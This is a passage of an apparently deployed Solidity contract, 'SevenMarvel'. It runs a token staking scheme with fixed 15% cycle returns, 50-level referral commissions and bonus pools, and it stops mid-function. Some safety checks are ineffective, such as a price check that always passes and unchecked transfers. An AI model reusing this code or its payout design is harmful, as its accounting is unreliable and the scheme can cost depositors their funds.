/**
 *Submitted for verification at polygonscan.com on 2023-05-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.0;
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external  returns (uint);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external  returns (uint);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount)external;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IRate {
    function getPANA_USDT() external view returns(uint256 panaprice,uint8 decimal);
}

contract SevenMarvel is Ownable{
    using SafeMath for uint256; 
    IERC20 public buToken;
    uint256 public startTime;
    uint256 public lastDistribute;
    address public defaultRefer;
    uint256 private constant minDepositToken = 100e8;
    uint256 private constant maxDepositToken = 10000e8;
    uint256 private constant referDepth = 50;
    uint256 private constant timeStep = 1 days; 
    uint256 private constant directPercents = 500;
    uint256 private constant dailyPercents = 100;
    uint256 private constant uptoFiftinPercents = 1500;
    uint256 private constant globalPoolPercents = 300;
    uint256 private constant directorPoolPercents = 200;
    uint256 private constant dayRewardPercents = 100;
    uint256 private constant baseDivider = 10000;
    uint256 public globalPool;
    uint256 public directorPool;
    address private commissionwallet;
    uint256 private baseUnit=1e8;
    uint256 public txFee =0.05 ether;
    uint256 public panaprice = 0;
    uint8 public panadecimal = 0;
    uint256[] private  teamManagercommission = [2000 ,1000 ,500]; 
    uint256[] private  dayPerCycle = [15, 15, 15, 15, 15, 15, 15, 17, 19, 21, 23, 25, 30];
    uint256 public totalUser;
    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze;
        uint256 roi;
        uint256 activeCycle;
        bool isUnfreezed;
        bool isUnfreezedRoi;
        bool deposit50percent;
        bool deposit100percent;
        uint256 depositeAmount;
    }

    struct UserInfo {
        address referrer;
        uint256 start; 
        uint256 useraActiveCycle;
        uint256 level; 
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 teamTotalDeposit;
        uint256 teamMaxDeposit_user;
        uint256 totalFreezed;
        uint256 totalRevenue;
        uint256 totalDirect;
        uint256 withdrawLimit;
    }

    struct RewardInfo {
        uint256 capitals;
        uint256 directIncm;
        uint256 levelCommission;
        uint256 globalPool;
        uint256 directorPool;
        uint256 teamManager;
        uint256 totaldirectorPool;
        uint256 totalCapitalclaimed;
        uint256 totalDirectIncm;
        uint256 totalGlobalPool;
        uint256 totalRoiClaimed;
        uint256 totalLevelCommission;
        uint256 totalTeamManagerCommission;
    }

    struct Level {
        uint256 percent;
        uint256 criteria;
        uint256 level;
    } 

    struct LapsInfo {
        uint256 lapsDirect;
        uint256 lapsLevel;
        uint256 LapsMtoM;
    }

    IRate public panaRate;
    Level[] internal levels;
    address[] public levelGlobalUsers;
    address[] public levelDirectorUsers;

    uint256 public levelGlobalUsersIndex = 0;
    uint256 public levelDirectorUsersIndex = 0;

    uint256 public rewardGlobalUsers;
    uint256 public rewardDirectorUsers;
    bool public isDistributeGlobalUsers;
    bool public isDistributeDirectorUsers;

    uint256 public GlobalUsersCount=0;
    uint256 public DirectorUsersCount=0;
    address public rewardPoolCaller;
    uint256 public loopLimit=200;

    
    mapping(address=>RewardInfo) public rewardInfo;
    mapping(address=>UserInfo) public userInfo;
    mapping(address=>LapsInfo) public lapsInfo;
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    mapping(address => OrderInfo[]) public orderInfos;
    address[] public depositors;
    uint256 public totalDepositFunds;
    mapping(address => uint256) public lplockedbalances;
    mapping(address => uint256) public usdtlockedbalances;
    mapping(address => uint256) public reserveLockedLimit;
    mapping(address => uint256) public withdrawalHold;

    uint256 private constant minReserveWithdrawal =10e8;
    uint256 private constant limitDirecBonusWithdrawal =5e8;
    uint256 private constant limitWorkingCommWithdrawal =10e8;

    struct LockLiquidityInfo {
        uint256 lpamount;
        uint256 tokenamount;
        uint256 maticamount;
        uint256 usdamount;
        uint256 date;
        bytes hash;
    }
    mapping(address => LockLiquidityInfo[]) public lockLiquidityInfo;

    uint256 private stageOne = 10; // 0.001 % if feeDenominator = 10000
    uint256 private stageTwo = 8; // 0.001 % if feeDenominator = 10000
    uint256 private stageThree = 5;
    uint256 private stageFour = 2;
    uint256 private feeDenominator = 1000;

    address payable public liquidityWallet;




    // Events
    event Register(address user, address referral,uint256 time);
    event Deposit(address user, uint256 amount,uint256 time);
    event Deposit_50percent(address user, uint256 amountm, uint256 index, uint256 time);
    event RemoveInvalidDeposit(address user, uint256 amount, uint256 time);
    event DirectIncm(address user,address upline, uint256 reward);
    event LiquidityLockHash(address indexed sender, bytes hash);

    constructor(address _tokenAddress,address _rateAddress){
        panaRate = IRate(_rateAddress);
        buToken = IERC20(_tokenAddress);
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = msg.sender;
        levels.push(Level(25, 0,1));
        levels.push(Level(10, 2,1));
        levels.push(Level(5, 4,1));
        levels.push(Level(3, 6,1));
        levels.push(Level(10, 12,2));
        levels.push(Level(5, 12,2));
        levels.push(Level(5, 12,2));
        levels.push(Level(5, 12,2));
        levels.push(Level(5, 12,2));
        levels.push(Level(5, 12,2));
        levels.push(Level(5, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(3, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(2, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
        levels.push(Level(1, 12,2));
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        require(userInfo[msg.sender].referrer == address(0), "referrer bonded");
        userInfo[msg.sender].referrer = _referral;
        userInfo[msg.sender].start = block.timestamp;
        // _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral,block.timestamp);
    }

    function getPanaUsdtRate() public view returns(uint256) {
        (uint256 price,)=panaRate.getPANA_USDT();
        return (price);
    }

    function getpanadata() public view returns(uint256){
        uint256 totalMysupplay=buToken.totalSupply();
        return totalMysupplay;
    }

    function calculateUSDPana(uint256 _amountAmount) private returns (uint256) {
        uint256 allo=buToken.allowance(msg.sender, address(this));
        uint256 bal =buToken.balanceOf(msg.sender) ;
        require( allo>= _amountAmount,"Call Allowance");
        require(bal>= _amountAmount,"InSufficient Token Funds..");

        uint256 totalMysupplay=buToken.totalSupply();
        uint256 transferFee=0;
        if(totalMysupplay <= 50000000000000000 && 
            totalMysupplay >= 25000000000000000){
            transferFee = _amountAmount.mul(stageOne).div(feeDenominator);
        }else
        if(totalMysupplay < 25000000000000000 && 
            totalMysupplay >= 12500000000000000){
           transferFee = _amountAmount.mul(stageTwo).div(feeDenominator);
        }else
        if(totalMysupplay < 12500000000000000 && 
            totalMysupplay >= 6250000000000000){
            transferFee = _amountAmount.mul(stageThree).div(feeDenominator);
        }else
        if(totalMysupplay < 6250000000000000 && 
            totalMysupplay >= 50000000000000){
            transferFee = _amountAmount.mul(stageFour).div(feeDenominator);
        }

        uint256 recieveAmount= _amountAmount.sub(transferFee);
        (uint256 price,)=panaRate.getPANA_USDT();
        require( price>= 0,"Zero price");
        uint256 _amount = recieveAmount.mul(price).div(baseUnit);
        _amount=_amount.div(baseUnit).mul(baseUnit);
        buToken.transferFrom(msg.sender, address(this), _amountAmount);
        return _amount; 
    }
    
    function deposit(uint256 _amountAmount) external {
        uint256 _amount = calculateUSDPana(_amountAmount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount,block.timestamp);
    }

    function deposit_50percent(uint256 _amountAmount,uint256 index) external {
        
         uint256 _amount = calculateUSDPana(_amountAmount);
        _deposit_50percent(msg.sender, _amount,index);
        emit Deposit_50percent(msg.sender, _amount,index, block.timestamp);
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        address upline = userInfo[_user].referrer;
        userInfo[_user].totalDeposit = userInfo[_user].totalDeposit.sub(_amount);
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }

                if(upline == defaultRefer) break;
                    upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }

        emit RemoveInvalidDeposit(_user,_amount,block.timestamp);

    }

    function _distributeDepositGlobalPool(uint256 _amount) private {
        uint256 global = _amount.mul(globalPoolPercents).div(baseDivider);
        globalPool = globalPool.add(global);
    }

    function _distributeDepositDirectorPool(uint256 _amount) private {
        uint256 director = _amount.mul(directorPoolPercents).div(baseDivider);
        directorPool = directorPool.add(director);
    }

    function _deposit_50percent(address _user, uint256 _amount, uint256 index) private {
        require(userInfo[_user].referrer != address(0), "register first"); //
        OrderInfo storage stakedata=orderInfos[_user][index];  ///
        require(_amount==stakedata.amount.div(2), "required amount min 50%"); //
        totalDepositFunds=totalDepositFunds.add(_amount); //
        if(block.timestamp > stakedata.unfreeze  && stakedata.isUnfreezed == false && stakedata.deposit50percent == false && stakedata.deposit100percent == false){
            stakedata.isUnfreezed = true;
            stakedata.deposit50percent=true;
            stakedata.depositeAmount=stakedata.depositeAmount.add(_amount);
            if(userInfo[_user].totalFreezed >= stakedata.amount){
                userInfo[_user].totalFreezed = userInfo[_user].totalFreezed.sub(_amount);
            }else{
                userInfo[_user].totalFreezed = 0;
            }
            _removeInvalidDeposit(_user, stakedata.amount);
            rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(stakedata.amount);
            userInfo[_user].withdrawLimit =userInfo[_user].withdrawLimit.add(_amount.mul(2));
            if(userInfo[_user].withdrawLimit<=stakedata.amount.mul(2)){
                userInfo[_user].withdrawLimit=0;
            }else{
                userInfo[_user].withdrawLimit =userInfo[_user].withdrawLimit.sub(stakedata.amount.mul(2));
            }
        }
        else if(block.timestamp > stakedata.unfreeze  && stakedata.isUnfreezed == true && stakedata.deposit50percent == true && stakedata.deposit100percent == false){
            stakedata.deposit100percent=true;
             _distributeDepositGlobalPool(stakedata.amount);
             _distributeDepositDirectorPool(stakedata.amount);
           uint256 tmpdayPerCycle = 1;
          if(userInfo[_user].useraActiveCycle < 7)
            {
                tmpdayPerCycle = dayPerCycle[0] * 1 days;
            }
            if(userInfo[_user].useraActiveCycle >= 7 && userInfo[_user].useraActiveCycle < 13)
            {
                tmpdayPerCycle = dayPerCycle[userInfo[_user].useraActiveCycle] * 1 days;
            }
            
            if(userInfo[_user].useraActiveCycle >= 13)
            {
                tmpdayPerCycle = dayPerCycle[12] * 1 days;
            }

            userInfo[_user].useraActiveCycle=userInfo[_user].useraActiveCycle + 1;    
            depositors.push(_user);
            userInfo[_user].totalDeposit = userInfo[_user].totalDeposit.add(stakedata.amount);
            userInfo[_user].totalFreezed = userInfo[_user].totalFreezed.add(_amount);
            userInfo[_user].withdrawLimit =userInfo[_user].withdrawLimit.add(_amount.mul(2));
            uint256 roiamount=stakedata.amount.mul(uptoFiftinPercents).div(baseDivider);
            uint256 unfreezeTime = block.timestamp.add(tmpdayPerCycle); 
            stakedata.depositeAmount=stakedata.depositeAmount.add(_amount);
            orderInfos[_user].push(OrderInfo(
               stakedata.depositeAmount,
                block.timestamp, 
                unfreezeTime,
                roiamount,
                userInfo[_user].useraActiveCycle,
                false,
                false,
                false,
                false,
                0
            ));

            _updateReferInfo(msg.sender, stakedata.depositeAmount); 
        }
    }

    function _deposit(address _user, uint256 _amount) private {
        require(userInfo[_user].referrer != address(0), "register first");
        require(userInfo[_user].maxDeposit == 0 || _amount >= userInfo[_user].maxDeposit, "less before");      
        uint256 smallAmount=0;
        require(_amount.mod(minDepositToken) == 0 , "mod err");
        totalDepositFunds=totalDepositFunds.add(_amount);
        if(_amount < userInfo[userInfo[_user].referrer].maxDeposit && userInfo[userInfo[_user].referrer].maxDeposit>0 )
        {
            smallAmount=_amount;
        }
        else if(userInfo[userInfo[_user].referrer].maxDeposit < _amount && userInfo[userInfo[_user].referrer].maxDeposit>0)
        {
            smallAmount=userInfo[userInfo[_user].referrer].totalDeposit;
             
        }
        else
        {
            smallAmount=_amount;
        }
        if(userInfo[_user].maxDeposit < _amount ){
            if(userInfo[userInfo[_user].referrer].maxDeposit>0){
                uint256 reward = smallAmount.mul(directPercents).div(baseDivider);
                uint256 lapsdirectamount = _amount.sub(smallAmount);
                lapsInfo[userInfo[_user].referrer].lapsDirect = lapsInfo[userInfo[_user].referrer].lapsDirect.add(lapsdirectamount.mul(directPercents).div(baseDivider));
                rewardInfo[userInfo[_user].referrer].directIncm = rewardInfo[userInfo[_user].referrer].directIncm.add(reward);
                userInfo[userInfo[_user].referrer].totalRevenue = userInfo[userInfo[_user].referrer].totalRevenue.add(reward);
                emit DirectIncm(_user,userInfo[_user].referrer,reward);
            }
        }
        if(userInfo[_user].maxDeposit == 0){
            userInfo[userInfo[_user].referrer].totalDirect=userInfo[userInfo[_user].referrer].totalDirect.add(1);
            _updateTeamNum(_user);
            userInfo[_user].maxDeposit = _amount;
        }else if(userInfo[_user].maxDeposit < _amount){
            userInfo[_user].maxDeposit = _amount;
        }
        _distributeDepositGlobalPool(_amount);
        _distributeDepositDirectorPool(_amount);
        uint256 tmpdayPerCycle = 1;
          if(userInfo[_user].useraActiveCycle < 7)
            {
                tmpdayPerCycle = dayPerCycle[0] * 1 days;
            }
            if(userInfo[_user].useraActiveCycle >= 7 && userInfo[_user].useraActiveCycle < 13)
            {
                tmpdayPerCycle = dayPerCycle[userInfo[_user].useraActiveCycle] * 1 days;
            }
            if(userInfo[_user].useraActiveCycle >= 13)
            {
                tmpdayPerCycle = dayPerCycle[12] * 1 days;
            }
        userInfo[_user].useraActiveCycle=userInfo[_user].useraActiveCycle + 1;
        depositors.push(_user);
        userInfo[_user].totalDeposit = userInfo[_user].totalDeposit.add(_amount);
        userInfo[_user].totalFreezed = userInfo[_user].totalFreezed.add(_amount);
        userInfo[_user].withdrawLimit =userInfo[_user].withdrawLimit.add(_amount.mul(2));
      
        // orderInfo ROI
        uint256 roiamount=_amount.mul(uptoFiftinPercents).div(baseDivider);        
        uint256 unfreezeTime = block.timestamp.add(tmpdayPerCycle);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            roiamount,
            userInfo[_user].useraActiveCycle,
            false,
            false,
            false,
            false,
            0
        ));
        _unfreezeFundAndUpdateReward(msg.sender, _amount);
        _updateReferInfo(msg.sender, _amount);
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && order.deposit50percent == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                if(userInfo[_user].totalFreezed > order.amount){
                    userInfo[_user].totalFreezed = userInfo[_user].totalFreezed.sub(order.amount);
                }else{
                    userInfo[_user].totalFreezed = 0;
                }
                if(userInfo[_user].withdrawLimit<=order.amount.mul(2)){
                    userInfo[_user].withdrawLimit=0;
                }else{
                    userInfo[_user].withdrawLimit =userInfo[_user].withdrawLimit.sub(order.amount.mul(2));
                }
                _removeInvalidDeposit(_user, order.amount);
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
            }
        }
    }
   
    function _updateReferInfo(address _user, uint256 _amount) private {
        address upline = userInfo[_user].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                if(userInfo[upline].teamMaxDeposit_user<_amount){
                    userInfo[upline].teamMaxDeposit_user=_amount;
                }
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    
    function withdrawCapital() public {
        RewardInfo storage userRewards =rewardInfo[msg.sender] ;
        uint256 withdrawable=userRewards.capitals;
        userRewards.totalCapitalclaimed=userRewards.totalCapitalclaimed.add(withdrawable);
        userRewards.capitals=0;
        (uint256 price,)=panaRate.getPANA_USDT();
        require( price>= 0,"Zero price");
        uint256 tokenAmount = withdrawable.mul(baseUnit).div(price);

        buToken.transfer(msg.sender, tokenAmount);
    }

    function withdrawDirectBonus() public{
        uint256 withdrawable;
            withdrawable=withdrawable.add(rewardInfo[msg.sender].directIncm);
            require(withdrawable>=limitDirecBonusWithdrawal,"minimum withdrawl of $5");
            rewardInfo[msg.sender].totalDirectIncm=rewardInfo[msg.sender].totalDirectIncm.add(rewardInfo[msg.sender].directIncm); 
            rewardInfo[msg.sender].directIncm=0;
             (uint256 price,)=panaRate.getPANA_USDT();
             require( price>= 0,"Zero price");
            uint256 tokenAmount = withdrawable.mul(baseUnit).div(price);

            buToken.transfer(msg.sender, tokenAmount);
    }

    function withdrawWorkingCommission() public {
        uint256 withdrawable;
         _managertomanagerCommision();
        withdrawable=withdrawable.add(rewardInfo[msg.sender].levelCommission);
        withdrawable=withdrawable.add(rewardInfo[msg.sender].globalPool);
        withdrawable=withdrawable.add(rewardInfo[msg.sender].teamManager);
        withdrawable=withdrawable.add(rewardInfo[msg.sender].directorPool);
        require(withdrawable>=limitWorkingCommWithdrawal,"minimum withdrawl of $10");
        rewardInfo[msg.sender].totalGlobalPool=rewardInfo[msg.sender].totalGlobalPool.add(rewardInfo[msg.sender].globalPool);
        rewardInfo[msg.sender].totaldirectorPool=rewardInfo[msg.sender].totaldirectorPool.add(rewardInfo[msg.sender].directorPool);
        rewardInfo[msg.sender].totalTeamManagerCommission=rewardInfo[msg.sender].totalTeamManagerCommission.add(rewardInfo[msg.sender].teamManager);
        rewardInfo[msg.sender].totalLevelCommission=rewardInfo[msg.sender].totalLevelCommission.add(rewardInfo[msg.sender].levelCommission);
        rewardInfo[msg.sender].levelCommission=0;
        rewardInfo[msg.sender].globalPool=0;
        rewardInfo[msg.sender].directorPool=0;
        rewardInfo[msg.sender].teamManager=0;
        require(userInfo[msg.sender].withdrawLimit >=withdrawable,"Increase staking Limit");
        userInfo[msg.sender].withdrawLimit=userInfo[msg.sender].withdrawLimit.sub(withdrawable);
        uint256 twentywithdraw = withdrawable.mul(2500).div(baseDivider);
        withdrawalHold[msg.sender] = withdrawalHold[msg.sender].add(twentywithdraw);
        withdrawable =withdrawable.sub(twentywithdraw);
        (uint256 price,)=panaRate.getPANA_USDT();
        require( price>= 0,"Zero price");
        uint256 tokenAmount = withdrawable.mul(baseUnit).div(price);

        buToken.transfer(msg.sender, tokenAmount);
    }

    function _managertomanagerCommision() private{
        uint256 levelCommission =rewardInfo[msg.sender].levelCommission;
        uint256 levelcnt=0;
        address uplinemgr = userInfo[msg.sender].referrer;
        for(uint256 j = 0; j <= referDepth && levelcnt<=2; j++){
            RewardInfo storage upRewardsMgr = rewardInfo[uplinemgr];
            UserInfo storage userMgr = userInfo[uplinemgr];
            if(userMgr.level>=3){ //for level 3,4,5 
                uint256 managerCommission = levelCommission.mul(teamManagercommission[levelcnt]).div(baseDivider);
                upRewardsMgr.teamManager = upRewardsMgr.teamManager.add(managerCommission);
                userMgr.totalRevenue = userMgr.totalRevenue.add(managerCommission);
                levelcnt=levelcnt.add(1); 
            }  
            uplinemgr = userMgr.referrer;
            if(uplinemgr == defaultRefer) break;
        }
    }
  
    function getTeamUsersLevelWise( address _address,uint256 _layer) public view returns(address[]  memory){
        return teamUsers[_address][_layer];
    }

    function withdrawRewards() public {
        uint256 totalRoiwithdrawable;
        for(uint256 i = 0; i < orderInfos[msg.sender].length ; i++){
            OrderInfo storage userRoi = orderInfos[msg.sender][i];
            if(block.timestamp >= userRoi.unfreeze && userRoi.isUnfreezedRoi== false){
            userRoi.isUnfreezedRoi=true;
            totalRoiwithdrawable=totalRoiwithdrawable.add(userRoi.roi);
            }
        }
        if(totalRoiwithdrawable>0){
            UserInfo storage user = userInfo[msg.sender];
            RewardInfo storage userRewards = rewardInfo[msg.sender];
            uint256 totalDepositClaimUser=user.totalDeposit;
            address upline = user.referrer;
            userRewards.totalRoiClaimed=userRewards.totalRoiClaimed.add(totalRoiwithdrawable);
            user.totalRevenue=user.totalRevenue.add(totalRoiwithdrawable);
            for(uint256 i = 0; i <= referDepth; i++){
                if(upline != address(0)){
                    uint256 newAmount = totalRoiwithdrawable;
                     uint256 levellapsamount;
                    user = userInfo[upline];
                    if(totalDepositClaimUser <= user.totalDeposit){
                        newAmount=totalDepositClaimUser;
                        
                    }else{
                        newAmount=user.totalDeposit;
                    }
                    if (newAmount < totalDepositClaimUser){
                        levellapsamount =totalDepositClaimUser.sub(user.totalDeposit);
                    }else{
                        levellapsamount =0;
                    }
                    RewardInfo storage upRewards = rewardInfo[upline];
                    UserInfo storage inuser = userInfo[upline];
                    if(inuser.totalDirect >= levels[i].criteria && inuser.level >= levels[i].level){
                        uint256 earndCommission=newAmount.mul(levels[i].percent).mul(15).div(baseDivider);
                        upRewards.levelCommission=upRewards.levelCommission.add(earndCommission);
                        if(levellapsamount>0){
                            lapsInfo[upline].lapsLevel = lapsInfo[upline].lapsLevel.add(levellapsamount.mul(levels[i].percent).mul(15).div(baseDivider));
                        }
                    }
                    if(upline == defaultRefer) break;
                    upline = user.referrer;
                }else{
                    break;
                }
            }
            uint256 fivewithdraw = totalRoiwithdrawable.mul(1000).div(baseDivider);
            withdrawalHold[msg.sender] = withdrawalHold[msg.sender].add(fivewithdraw);
            totalRoiwithdrawable =totalRoiwithdrawable.sub(fivewithdraw);
            (uint256 price,)=panaRate.getPANA_USDT();
            require( price>= 0,"Zero price");
            uint256 tokenAmount = totalRoiwithdrawable.mul(baseUnit).div(price);
            buToken.transfer(msg.sender, tokenAmount);

        }else{
            revert("No Reward Found");
        }
    }

    function _updateTeamNum(address _user) private {
        address upline = userInfo[_user].referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > userInfo[_user].level){
            userInfo[_user].level = levelNow;
            if(levelNow == 3){
                levelGlobalUsers.push(_user);
            }
             if(levelNow == 4){
                levelDirectorUsers.push(_user);
            }
        }
    }

    function _calLevelNow(address _user) private view returns(uint256) {
       (uint256 maxTeam, uint256 otherTeam, uint256 totalTeam) = getTotalTeam(_user);
        uint256 levelNow;
        if(totalTeam >= 10000 && maxTeam >= 5000 && otherTeam >= 5000 && userInfo[_user].totalDirect>=35){
            levelNow = 4;   
        }else if(totalTeam >= 1000 && maxTeam >= 500 && otherTeam >= 500 && userInfo[_user].totalDirect>=35){
            levelNow = 3; 
        }else if(totalTeam >= 100 && maxTeam >= 50 && otherTeam >= 50 && userInfo[_user].totalDirect>=25){
            levelNow = 5; 
        }
        else if(totalTeam >= 100 && maxTeam >= 50 && otherTeam >= 50 && userInfo[_user].totalDirect>=12){
            levelNow = 2;  
        }
        else{
            levelNow = 1; 
        }
        return levelNow;
    }

    function getTotalTeam(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamNum.add(1);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            if(orderInfos[_user][i - 1].unfreeze > block.timestamp){
                if(orderInfos[_user][i - 1].amount > maxFreezing){
                    maxFreezing = orderInfos[_user][i - 1].amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function distributePoolRewardsAdmin() public {
        require(msg.sender==rewardPoolCaller,"operation not allowed");

        if(block.timestamp > lastDistribute.add(timeStep)){
            // add here reward calculate for per user

            if(levelGlobalUsers.length > 0){
                GlobalUsersCount = levelGlobalUsers.length;
                rewardGlobalUsers = globalPool.div(levelGlobalUsers.length);
                globalPool = 0;
                isDistributeGlobalUsers = true;
                levelGlobalUsersIndex=0;
            }
            
            if(levelDirectorUsers.length > 0){
                DirectorUsersCount = levelDirectorUsers.length;
                rewardDirectorUsers = directorPool.div(levelDirectorUsers.length);
                directorPool = 0;
                isDistributeDirectorUsers = true;
                levelDirectorUsersIndex=0;
            }

            lastDistribute =  block.timestamp;
        }

    }

    function WorkerDistributeGlobalPool() public
    {
        require(msg.sender==rewardPoolCaller,"operation not allowed");

        if(levelGlobalUsersIndex < GlobalUsersCount && isDistributeGlobalUsers)
        {
            uint256 limit=levelGlobalUsersIndex + loopLimit;
            if(GlobalUsersCount<limit)
            {
                limit = GlobalUsersCount;
            }

